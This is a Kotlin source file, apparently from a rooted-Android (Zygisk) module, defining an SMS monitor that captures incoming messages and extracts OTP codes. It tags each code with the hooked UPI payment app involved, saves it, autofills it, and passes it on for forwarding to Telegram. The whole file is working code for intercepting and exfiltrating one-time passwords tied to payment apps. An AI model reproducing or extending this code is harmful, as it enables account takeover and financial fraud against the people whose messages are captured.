package com.hivirtus.zygiskmode

import android.content.Context
import android.util.Log

/**
 * OTP capture — sirf SMS_RECEIVED broadcast pe (inbox polling nahi).
 */
class SmsCaptureMonitor(
    private val context: Context,
    private val onCaptured: (LastOtp) -> Unit
) {
    private val configManager = ConfigManager(context)
    private var running = false

    fun start() {
        if (running) return
        running = true
        Log.i(TAG, "SMS capture: broadcast-only (no ContentObserver)")
    }

    fun stop() {
        running = false
    }

    fun onBroadcastSms(sender: String, body: String): Boolean {
        if (!running) return false
        return processIncoming(sender, body)
    }

    fun processIncoming(sender: String, body: String): Boolean {
        if (sender.isBlank() || body.isBlank()) return false
        val config = configManager.load()
        if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) return false
        deliver(config, sender, body, "incoming")
        return SmsMatcher.shouldForwardToTelegram(config, sender, body, "incoming")
    }

    private fun deliver(config: ModuleConfig, actualPeer: String, body: String, direction: String) {
        if (!SmsMatcher.shouldInterceptIncoming(config, actualPeer, body)) return

        val interceptDisplay = SmsMatcher.interceptDisplay(config, actualPeer, configManager)
        val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
        val label = SmsMatcher.matchedHookedApp(config, actualPeer, body)?.displayName
            ?: ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }
            .orEmpty()
        val now = System.currentTimeMillis()
        val otp = LastOtp(
            otp = token,
            sender = interceptDisplay,
            body = body,
            phone = interceptDisplay,
            messageLabel = label,
            direction = direction,
            rawPeer = actualPeer,
            capturedAt = now
        )
        OtpCaptureWriter.write(context, otp)
        OtpAutoFillHelper.onHookedOtpCaptured(context, config, otp)
        if (SmsMatcher.shouldForwardToTelegram(config, actualPeer, body, direction)) {
            onCaptured(otp)
        }
    }

    companion object {
        private const val TAG = "SmsCaptureMonitor"
    }
}
